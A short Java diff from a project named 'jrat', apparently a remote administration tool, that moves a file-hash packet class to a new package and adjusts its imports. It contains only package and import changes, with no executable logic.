@@ -1,9 +1,9 @@
-package jrat.client.packets.incoming;
+package jrat.module.fs.packets;
 
+import jrat.client.packets.incoming.AbstractIncomingPacket;
 import jrat.common.hash.Md5;
 import jrat.common.hash.Sha1;
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.Packet46FileHash;
 
 import java.io.File;
 
